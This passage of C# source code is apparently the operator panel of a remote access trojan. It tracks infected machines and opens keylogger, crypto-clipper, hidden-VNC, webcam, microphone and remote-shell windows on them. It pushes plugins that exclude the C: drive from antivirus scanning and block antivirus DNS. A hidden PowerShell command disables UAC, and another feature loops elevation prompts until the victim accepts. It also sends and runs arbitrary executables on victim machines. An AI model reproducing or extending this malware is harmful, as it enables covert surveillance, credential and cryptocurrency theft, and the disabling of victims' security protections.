            linePoints.Add(new System.Windows.Point(x, y));
            fillPoints.Add(new System.Windows.Point(x, y));
        }
        // Close fill polygon at bottom corners
        fillPoints.Add(new System.Windows.Point(padL + 23 * step, padT + chartH));
        fillPoints.Add(new System.Windows.Point(padL, padT + chartH));

        DashChartLine.Points = linePoints;
        DashChartFill.Points = fillPoints;

        // Hour labels every 6h: -18h, -12h, -6h, now
        var labelBrush = new SolidColorBrush(Color.FromArgb(0x60, 0x80, 0x90, 0xB4));
        foreach (int idx in new[] { 0, 6, 12, 18, 23 })
        {
            double x = padL + idx * step;
            var label = new TextBlock
            {
                Text       = idx == 23 ? "now" : $"-{23 - idx}h",
                Foreground = labelBrush,
                FontSize   = 8,
            };
            Canvas.SetLeft(label, x - 8);
            Canvas.SetTop(label,  h - padB + 3);
            DashChart.Children.Add(label);
        }
    }

    private void AnimateCounter(TextBlock tb, int to)
    {
        if (!int.TryParse(tb.Text, out int from) || from == to) { tb.Text = to.ToString(); return; }

        // Stop any previous animation on this TextBlock before starting a new one,
        // otherwise multiple timers pile up and fight over the same Text property.
        if (_counterTimers.TryGetValue(tb, out var prev)) { prev.Stop(); _counterTimers.Remove(tb); }

        int steps = 8, step = 0;
        double delta = (to - from) / (double)steps;
        var t = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(30) };
        _counterTimers[tb] = t;
        t.Tick += (_, _) =>
        {
            if (++step >= steps) { tb.Text = to.ToString(); t.Stop(); _counterTimers.Remove(tb); }
            else tb.Text = ((int)(from + delta * step)).ToString();
        };
        t.Start();
    }

    private void RefreshDashboard()
    {
        var online = _server?.ConnectedClients.Count ?? 0;
        var total  = _store.AllClients.Count;

        AnimateCounter(DashOnline, online);
        AnimateCounter(DashTotal,  total);

        DashLastUpdated.Text = DateTime.Now.ToString("HH:mm:ss");

        // ── New 24h: unique clients that connected in the last 24h ──────────
        var now = DateTime.UtcNow;
        int new24h = 0;
        foreach (var rec in _store.AllClients.Values)
        {
            lock (rec.ActivityLog)
            {
                if (rec.ActivityLog.Any(e =>
                    (now - e.Time).TotalHours < 24 &&
                    e.Action.StartsWith("Connected", StringComparison.OrdinalIgnoreCase)))
                    new24h++;
            }
        }
        AnimateCounter(DashNew24h, new24h);

        // ── Tagged count (all records) ─────────────────────────────────────
        int tagged = _store.AllClients.Values.Count(r => !string.IsNullOrEmpty(r.Tag));
        DashTagged.Text = tagged.ToString();

        // ── Stat pills (from currently online clients) ──────────────────────
        var clients = _server?.ConnectedClients.Values.ToList() ?? [];
        int n = clients.Count;
        if (n > 0)
        {
            int win11   = clients.Count(c => c.OS.Contains("11"));
            int win10   = clients.Count(c => c.OS.Contains("10") && !c.OS.Contains("11"));
            int other   = n - win11 - win10;
            int cam     = clients.Count(c => c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase));
            int admin   = clients.Count(c => c.IsAdmin);
            DashWin11.Text   = $"{win11 * 100 / n}%";
            DashWin10.Text   = $"{win10 * 100 / n}%";
            DashOsOther.Text = $"{other * 100 / n}%";
            DashWebcam.Text  = $"{cam   * 100 / n}%";
            DashAdmin.Text   = $"{admin * 100 / n}%";
            DashOsWin11Bar.Value = win11 * 100 / n;
            DashOsWin10Bar.Value = win10 * 100 / n;
            DashOsOtherBar.Value = other * 100 / n;

            var topGroup = clients
                .Where(c => !string.IsNullOrEmpty(c.Country) && c.Country != "...")
                .GroupBy(c => c.Country)
                .OrderByDescending(g => g.Count())
                .FirstOrDefault();
            DashTopCountry.Text = topGroup != null
                ? $"{topGroup.Key} ×{topGroup.Count()}"
                : "—";
        }
        else
        {
            DashWin11.Text = DashWin10.Text = DashOsOther.Text = "—";
            DashWebcam.Text = DashAdmin.Text = "—";
            DashTopCountry.Text = "—";
            DashOsWin11Bar.Value = DashOsWin10Bar.Value = DashOsOtherBar.Value = 0;
        }

        // ── 24h activity chart ──────────────────────────────────────────────
        DrawActivityChart();

        UpdateClientCount();

        if (_clientsDirty)
        {
            _clientsDirty = false;
            RefreshClients();
            RefreshAllClients();
        }
        if (_autoTasksDirty) { _autoTasksDirty = false; GridAutoTasks.Items.Refresh(); }
    }

    // ── Client Actions ──────────────────────────────

    private List<ConnectedClient> GetSelectedClients()
    {
        return GridClients.SelectedItems.Cast<ConnectedClient>().ToList();
    }

    private async void DisconnectClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (_server == null || clients.Count == 0) return;
        string msg = clients.Count == 1
            ? $"Disconnect '{clients[0].Username}@{clients[0].IP}'?"
            : $"Disconnect {clients.Count} clients?";
        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        foreach (var client in clients)
        {
            try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
            await Task.Delay(150);
            _server.DisconnectClient(client.Id);
        }
    }

    // ── Column width persistence ──────────────────────────────────────────────

    private void RestoreGridColumnWidths()
    {
        foreach (var col in GridClients.Columns)
        {
            string header = col.Header?.ToString() ?? "";
            if (string.IsNullOrEmpty(header)) continue;
            int w = UiPrefs.GetInt($"ColWidth_{header}", 0);
            if (w > 0) col.Width = new System.Windows.Controls.DataGridLength(w);
        }
    }

    private void SetupGridColumnPersistence()
    {
        var desc = System.ComponentModel.DependencyPropertyDescriptor
            .FromProperty(System.Windows.Controls.DataGridColumn.WidthProperty,
                          typeof(System.Windows.Controls.DataGridColumn));
        foreach (var col in GridClients.Columns)
            desc.AddValueChanged(col, (_, _) => SaveGridColumnWidths());
    }

    private void SaveGridColumnWidths()
    {
        foreach (var col in GridClients.Columns)
        {
            string header = col.Header?.ToString() ?? "";
            if (string.IsNullOrEmpty(header)) continue;
            double w = col.ActualWidth;
            if (w > 0) UiPrefs.Set($"ColWidth_{header}", (int)w);
        }
    }

    private void GridClients_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key == System.Windows.Input.Key.A && System.Windows.Input.Keyboard.Modifiers == System.Windows.Input.ModifierKeys.Control)
        {
            GridClients.SelectAll();
            e.Handled = true;
        }
    }

    private void GridClients_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        var count = GridClients.SelectedItems.Count;
        if (count > 0)
        {
            TxtSelectedCount.Text = $"{count} selected";
            BorderSelectedCount.Visibility = Visibility.Visible;
        }
        else
        {
            BorderSelectedCount.Visibility = Visibility.Collapsed;
        }
    }

    internal void OpenFeatureWindow<T>(string clientId, Func<T> factory) where T : Window
    {
        string key = $"{clientId}:{typeof(T).Name}";
        if (_featureWindows.TryGetValue(key, out var existing))
        {
            if (existing.WindowState == WindowState.Minimized)
                existing.WindowState = WindowState.Normal;
            existing.Activate();
            return;
        }
        var win = factory();

        // Automatically set title and header label on creation
        string tag = "";
        if (_server != null && _server.ConnectedClients.TryGetValue(clientId, out var client))
        {
            tag = client.Tag;
        }
        string friendly = GetFriendlyWindowName(win);
        win.Title = string.IsNullOrEmpty(tag) ? $"{friendly} — {clientId}" : $"{friendly} — {tag} ({clientId})";

        if (win.FindName("TxtTitle") is TextBlock tbTitle)
        {
            tbTitle.Text = string.IsNullOrEmpty(tag) ? clientId : $"{tag} ({clientId})";
        }
        else if (win.FindName("TxtClientId") is TextBlock tbClient)
        {
            tbClient.Text = string.IsNullOrEmpty(tag) ? $"[ {clientId} ]" : $"[ {tag} ({clientId}) ]";
        }

        _featureWindows[key] = win;
        win.Closed += (_, _) => _featureWindows.Remove(key);
        win.Show();

        if (typeof(T).Name != "RemoteDesktopWindow" && typeof(T).Name != "WebcamWindow")
        {
            Log($"[ADMIN] {friendly} opened for client {clientId}.");
        }
    }

    private void RemoteShell_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        LogAdminAction("Remote Shell", clients.Count, clients[0].Id);
        var server = _server;
        var newClients = new List<ConnectedClient>();
        foreach (var c in clients)
        {
            string key = $"{c.Id}:RemoteShellWindow";
            if (_featureWindows.TryGetValue(key, out var existing))
            {
                if (existing.WindowState == WindowState.Minimized)
                    existing.WindowState = WindowState.Normal;
                existing.Activate();
            }
            else newClients.Add(c);
        }
        if (newClients.Count == 0) return;
        var win = new RemoteShellWindow(server, newClients);
        var keys = newClients.Select(c => $"{c.Id}:RemoteShellWindow").ToList();
        foreach (var k in keys) _featureWindows[k] = win;
        win.Closed += (_, _) => { foreach (var k in keys) _featureWindows.Remove(k); };
        win.Show();
    }

    private async void RemoteDesktop_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        LogAdminAction("Remote Desktop", clients.Count, clients[0].Id);
        var server = _server;
        var area = SystemParameters.WorkArea;
        const int step = 28, margin = 40, winW = 900, winH = 560;
        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
        int i = 0;
        foreach (var c in clients)
        {
            int s = (i % maxSteps) * step;
            OpenFeatureWindow<RemoteDesktopWindow>(c.Id, () =>
            {
                var w = new RemoteDesktopWindow(server, c.Id);
                w.Left = area.Left + margin + s;
                w.Top  = area.Top  + margin + s;
                return w;
            });
            i++;
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void RemoteWebcam_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        LogAdminAction("Remote Webcam", clients.Count, clients[0].Id);
        var server = _server;

        // Filter to clients that actually have a camera
        var eligible = clients.Where(c => !c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase)).ToList();
        if (eligible.Count == 0) return;

        // Determine layout mode
        WebcamLayout layout = WebcamLayout.Cascade; // default for < 4
        if (eligible.Count >= 4)
        {
            var result = WebcamLayoutDialog.Prompt(this);
            if (result == null) return; // user cancelled
            layout = result.Value;
        }

        var area = SystemParameters.WorkArea;

        if (layout == WebcamLayout.Tile)
        {
            // Calculate grid dimensions
            int count = eligible.Count;
            int cols = (int)Math.Ceiling(Math.Sqrt(count));
            int rows = (int)Math.Ceiling((double)count / cols);
            double tileW = area.Width / cols;
            double tileH = area.Height / rows;
            // Enforce minimums
            tileW = Math.Max(tileW, 420);
            tileH = Math.Max(tileH, 320);

            int i = 0;
            foreach (var c in eligible)
            {
                int col = i % cols;
                int row = i / cols;
                double left = area.Left + col * tileW;
                double top  = area.Top  + row * tileH;
                double w = tileW;
                double h = tileH;

                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
                {
                    var win = new WebcamWindow(server, c.Id);
                    win.Left   = left;
                    win.Top    = top;
                    win.Width  = w;
                    win.Height = h;
                    return win;
                });
                i++;
                if (eligible.Count > 1) await Task.Delay(80);
            }
        }
        else // Cascade
        {
            const int step = 28, margin = 60, winW = 700, winH = 520;
            int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
            int i = 0;
            foreach (var c in eligible)
            {
                int s = (i % maxSteps) * step;
                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
                {
                    var w = new WebcamWindow(server, c.Id);
                    w.Left = area.Left + margin + s;
                    w.Top  = area.Top  + margin + s;
                    return w;
                });
                i++;
                if (eligible.Count > 1) await Task.Delay(80);
            }
        }
    }

    private async void TcpManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<TcpManagerWindow>(c.Id, () => new TcpManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void StartupManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<StartupManagerWindow>(c.Id, () => new StartupManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void FileManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<FileManagerWindow>(c.Id, () => new FileManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Microphone_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<MicrophoneWindow>(c.Id, () => new MicrophoneWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Fun_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<FunWindow>(c.Id, () => new FunWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void ProcessManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<ProcessManagerWindow>(c.Id, () => new ProcessManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void Socks5_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<Socks5Window>(c.Id, () => new Socks5Window(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    // ── New feature window handlers ──────────────────────────────────────────

    private async void ServiceManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<ServiceManagerWindow>(c.Id, () => new ServiceManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void WindowManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<WindowManagerWindow>(c.Id, () => new WindowManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void RegistryEditor_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            if (!c.IsAdmin)
            {
                var r = MessageBox.Show(
                    $"Client {c.Id} is NOT running as administrator.\n\nThe Registry Editor requires admin privileges to write/delete keys.\nReading HKCU keys will still work.\n\nOpen anyway?",
                    "Admin Recommended", MessageBoxButton.YesNo, MessageBoxImage.Warning);
                if (r != MessageBoxResult.Yes) continue;
            }
            OpenFeatureWindow<RegistryEditorWindow>(c.Id, () => new RegistryEditorWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void InstalledApps_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<InstalledAppsWindow>(c.Id, () => new InstalledAppsWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void DeviceManager_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<DeviceManagerWindow>(c.Id, () => new DeviceManagerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void PerformanceMonitor_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<PerformanceMonitorWindow>(c.Id, () => new PerformanceMonitorWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    // ── Miscellaneous quick-send to selected clients ────────────────────────
    #pragma warning disable CS4014
    private void QuickExcludeCDrive_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            // Compile (or use cache) then send to selected clients only
            var cachePath = PluginCachePath("Exclude C:\\");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_ExcludeCDrive_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Exclude C:\\ sent to {clients.Count} client(s)."));
        });
    }

    private void QuickBlockAvDns_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            var cachePath = PluginCachePath("Block AV DNS");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_BlockAvDomains_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block AV DNS sent to {clients.Count} client(s)."));
        });
    }

    private void QuickBlockReset_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        _ = Task.Run(async () =>
        {
            var cachePath = PluginCachePath("Block Reset");
            if (!System.IO.File.Exists(cachePath))
            {
                AutoTask_BlockReset_Click(sender, e);
                return;
            }
            var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
            var pkt = new Protocol.Packet
            {
                Type = Protocol.PacketType.PluginExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new Protocol.PluginExecData
                { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" })
            };
            foreach (var c in clients) await _server.SendToClient(c.Id, pkt);
            Dispatcher.BeginInvoke(() => Log($"[ADMIN] Block WSReset sent to {clients.Count} client(s)."));
        });
    }
    private async void QuickDisableUac_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var adminClients = clients.Where(c => c.IsAdmin).ToList();
        if (adminClients.Count == 0) { Log("[!] Disable UAC: no admin clients selected."); return; }

        var cmd = "powershell -NoP -NonI -W Hidden -Command \"" +
            "$p='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';" +
            "Set-ItemProperty $p EnableLUA 0 -Type DWord -Force;" +
            "Set-ItemProperty $p ConsentPromptBehaviorAdmin 0 -Type DWord -Force;" +
            "Set-ItemProperty $p ConsentPromptBehaviorUser 0 -Type DWord -Force;" +
            "Set-ItemProperty $p PromptOnSecureDesktop 0 -Type DWord -Force\"";

        var pkt = new Protocol.Packet { Type = Protocol.PacketType.AutoTaskShell, Data = cmd };
        foreach (var c in adminClients)
            await _server.SendToClient(c.Id, pkt);
        Log($"[ADMIN] Disable UAC sent to {adminClients.Count} admin client(s) (takes effect after reboot).");
    }
    #pragma warning restore CS4014

    private TikTokWindow? _tikTokWindow;
    private void TikTok_Click(object sender, RoutedEventArgs e)
    {
        if (_server == null) return;
        if (_tikTokWindow == null || !_tikTokWindow.IsLoaded)
        {
            // Materialize now — lazy LINQ over SelectedItems would evaluate after window opens
            var selectedIds = GridClients.SelectedItems.Cast<ConnectedClient>().Select(c => c.Id).ToList();
            _tikTokWindow = new TikTokWindow(_server, selectedIds) { Owner = this };
            _tikTokWindow.Show();
        }
        else
            _tikTokWindow.Activate();
    }

    private async void Keylogger_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<KeyloggerWindow>(c.Id, () => new KeyloggerWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private async void CryptoClipper_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        foreach (var c in clients)
        {
            OpenFeatureWindow<CryptoClipperWindow>(c.Id, () => new CryptoClipperWindow(_server, c.Id, c.Id));
            if (clients.Count > 1) await Task.Delay(80);
        }
    }

    private HvncBroadcastWindow? _broadcastWindow;
    private void HvncBroadcast_Click(object sender, RoutedEventArgs e)
    {
        if (_server == null) return;
        if (_broadcastWindow == null || !_broadcastWindow.IsLoaded)
        {
            _broadcastWindow = new HvncBroadcastWindow(_server) { Owner = this };
            _broadcastWindow.Show();
        }
        else
            _broadcastWindow.Activate();
    }

    private async void Hvnc_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;
        var server = _server;
        var area = SystemParameters.WorkArea;
        const int step = 28, margin = 60, winW = 900, winH = 580;
        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
        int i = 0;
        foreach (var c in clients)
        {
            int s = (i % maxSteps) * step;
            OpenFeatureWindow<HvncWindow>(c.Id, () =>
            {
                var w = new HvncWindow(server, c.Id);
                w.Left = area.Left + margin + s;
                w.Top  = area.Top  + margin + s;
                return w;
            });
            i++;
            if (clients.Count > 1) await Task.Delay(80);
        }
    }


    private async void RemoteFileExec_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select file to execute on client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new RemoteFileExecData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.RemoteFileExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            foreach (var client in clients)
            {
                await _server.SendToClient(client.Id, packet);
            }

            Log($"[ADMIN] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
            SetStatus($"File sent to {clients.Count} client(s).");
        }
        catch (Exception ex)
        {
            Log($"[!] Remote file exec failed: {ex.Message}");
        }
    }

    private async void UpdateClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select client binary to update client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new UpdateClientData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.UpdateClient,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            foreach (var client in clients)
            {
                await _server.SendToClient(client.Id, packet);
            }

            Log($"[ADMIN] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s). ");
            SetStatus($"Update file sent to {clients.Count} client(s).");
        }
        catch (Exception ex)
        {
            Log($"[!] Update client failed: {ex.Message}");
        }
    }

    private async void UninstallClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var result = MessageBox.Show(
            $"Uninstall client from {clients.Count} machine(s)?\nThis will remove persistence and delete the client.",
            "Confirm Uninstall",
            MessageBoxButton.YesNo,
            MessageBoxImage.Warning);

        if (result != MessageBoxResult.Yes) return;

        var packet = new Packet { Type = PacketType.Uninstall };

        foreach (var client in clients)
        {
            client.PendingUninstall = true;
            await _server.SendToClient(client.Id, packet);
            Log($"[ADMIN] Uninstall sent to {client.Username}@{client.IP} ({client.Id}).");
        }

        SetStatus($"Uninstall sent to {clients.Count} client(s).");
    }

    // ── UAC Elevation ───────────────────────────────

    private async void RequestElevation_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var packet = new Packet { Type = PacketType.RequestElevation };
        foreach (var client in clients)
        {
            await _server.SendToClient(client.Id, packet);
            Log($"[ADMIN] [UAC] Elevation request sent to {client.Username}@{client.IP}.");
        }

        SetStatus($"UAC elevation sent to {clients.Count} client(s).");
    }

    private async void RequestElevationLoop_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var result = MessageBox.Show(
            $"Loop UAC popup on {clients.Count} machine(s) until user accepts?",
            "Confirm UAC Loop",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result != MessageBoxResult.Yes) return;

        var packet = new Packet { Type = PacketType.RequestElevationLoop };
        foreach (var client in clients)
        {
            await _server.SendToClient(client.Id, packet);
            Log($"[ADMIN] [UAC] Elevation loop started on {client.Username}@{client.IP}.");
        }

        SetStatus($"UAC loop started on {clients.Count} client(s).");
    }

    // ── Tags ────────────────────────────────────────

    private void SetTag_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var currentTag = clients.Count == 1 ? clients[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        if (dlg.ShowDialog() != true) return;

        foreach (var client in clients)
        {
            client.Tag = dlg.TagValue;
            _store.SetTag(client.Hwid, dlg.TagValue);
            UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
        }

        System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients)?.Refresh();
        RefreshAllClients();

        // CollectionView.Refresh() clears DataGrid selection — restore it
        GridClients.UnselectAll();
        foreach (var c in clients)
            GridClients.SelectedItems.Add(c);

        SetStatus($"Tag set on {clients.Count} client(s).");
    }

    private void SetTagRecord_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var currentTag = records.Count == 1 ? records[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        if (dlg.ShowDialog() != true) return;

        foreach (var record in records)
        {
            _store.SetTag(record.Hwid, dlg.TagValue);
        }

        // Also update any connected clients with matching HWID
        if (_server != null)
        {
            foreach (var record in records)
            {
                foreach (var client in _server.ConnectedClients.Values)
                {
                    if (client.Hwid == record.Hwid)
                    {
                        client.Tag = dlg.TagValue;
                        UpdateOpenWindowTitlesAndLabels(client.Id, dlg.TagValue);
                    }
                }
            }
        }

        RefreshClients();
        RefreshAllClients();
        SetStatus($"Tag set on {records.Count} record(s).");
    }

    // ── Client Logs ─────────────────────────────────

    private void ViewClientLogs_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        foreach (var client in clients)
        {
            if (_store.AllClients.TryGetValue(client.Hwid, out var record))
            {
                var logWin = new ClientLogWindow(record) { Owner = this };
                logWin.Show();
            }
        }
    }

    private void ViewRecordLogs_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        foreach (var record in records)
        {
            var logWin = new ClientLogWindow(record) { Owner = this };
            logWin.Show();
        }
    }

    // ── Copy ────────────────────────────────────────

    private void CopyHwid_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var hwids = string.Join("\n", clients.Select(c => c.Hwid));
        Clipboard.SetText(hwids);
        SetStatus(clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs");
    }

    private void CopyIP_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var ips = string.Join("\n", clients.Select(c => c.IP));
        Clipboard.SetText(ips);
        SetStatus(clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs");
    }

    // ── Client search ─────────────────────────────────────────────────────────

    private void TxtSearch_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
    {
        if (_searchDebounce == null)
        {
            _searchDebounce = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(250) };
            _searchDebounce.Tick += (_, _) =>
            {
                _searchDebounce.Stop();
                System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients)?.Refresh();
            };
        }
        _searchDebounce.Stop();
        _searchDebounce.Start();
    }

    private void TxtSearch_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key != System.Windows.Input.Key.Enter) return;

        // Select all clients currently visible after the filter
        GridClients.SelectAll();

        // If exactly one result, focus the grid so context menu / actions work immediately
        if (GridClients.Items.Count == 1)
            GridClients.Focus();

        e.Handled = true;
    }

    private bool ClientFilter(object obj)
    {
        if (obj is not ConnectedClient c) return false;

        // 1. Search Query Filter
        var q = TxtSearch?.Text?.Trim() ?? "";
        if (!string.IsNullOrEmpty(q))
        {
            bool match = c.IP.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Id.Contains(q, StringComparison.OrdinalIgnoreCase)
                || c.Tag.Contains(q, StringComparison.OrdinalIgnoreCase)
